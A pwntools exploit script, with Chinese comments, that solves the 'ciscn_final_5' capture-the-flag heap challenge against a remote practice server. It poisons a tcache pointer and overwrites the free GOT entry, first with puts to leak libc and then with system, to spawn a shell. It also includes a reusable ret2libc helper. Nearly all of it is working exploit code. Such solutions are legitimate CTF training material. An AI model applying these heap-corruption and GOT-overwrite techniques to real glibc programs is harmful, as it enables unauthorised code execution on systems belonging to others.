from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './ciscn_final_5'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',25589) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
libc = ELF('./libc.so.6')
# patchelf --set-interpreter /lib64/32_3-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件
# patchelf --set-interpreter /lib64/2_27-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件

def bytes2int(content):
	return str(content,encoding='utf-8')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(index,len,content=b'a'):
    sa(b'your choice:',b'1')
    sa(b':',int2bytes(index))
    sa(b':', int2bytes(len))
    sa(b':',content)

# def show(index):
#     sla(b':',b'3')
#     sla(b':',int2bytes(index))

def edit(index,content):
    sa(b'your choice:',b'3')
    sa(b':',int2bytes(index))
    sa(b':',content)

def delete(index):
    sa(b'your choice:',b'2')
    sa(b':',int2bytes(index))

ptr = 0x6020E0
free_got = elf.got['free']
puts_got = elf.got['puts']
atoi_got = elf.got['atoi']
puts_plt = elf.plt['puts']

add(16,0x10,p64(0)+p64(0x90))#0
add(1,0xc0,b'a')#1
delete(0)
delete(1)

#伪造tcache的fd指针为ptr
payload = p64(0) + p64(0xd1) + p64(ptr)
add(2,0x80,payload)

#类似tcache double free取出的操作
#注意这里采用覆盖free_got表实现libc_leak,覆盖atoi_got实现getshell，而没有直接采用将binsh和其地址直接写入ptr数组并覆盖free_got为system来delete，从而getshell的方法
#原因是本题delete的参数index从ptr数组中遍历最低位得到的第一个chunk，而非直接的索引，所以要构造binsh地址相对来说比较麻烦，free_got本身占据index8，泄露libc后chunk1也变成0
#但经过多次调试后也达到了使用第二种方法成功攻击的结果，即注释部分，纯净版见exp1
add(3,0xc0)
payload = p64(free_got) + p64(puts_got + 1) + p64(ptr + 0x20 + 3) + p64(0) + b'ls;/bin/sh\x00\x00\x00\x00\x00\x00' + p64(0)*14 + p32(0x10)*8
add(4,0xc0,payload)

#这里edit的index为8，因为index要和地址的低四位相同，free_got为0x602018，低四位为8
#且因为读入地址为free_got&0xFFFFFFFFFFFFFFF0 即 0x602010，所以需要第二个p64用puts_plt才能实现改写
edit(8,p64(puts_plt)*2)

delete(1)
puts_addr = uu64(ru(b'\x7f',drop=False)[-6:])
libc_base = puts_addr - libc.sym['puts']
log.success('libc_base '+hex(libc_base))
system_addr = libc_base + libc.sym['system']

#修改free_got为system
edit(8,p64(system_addr)*2)

delete(3)

itr()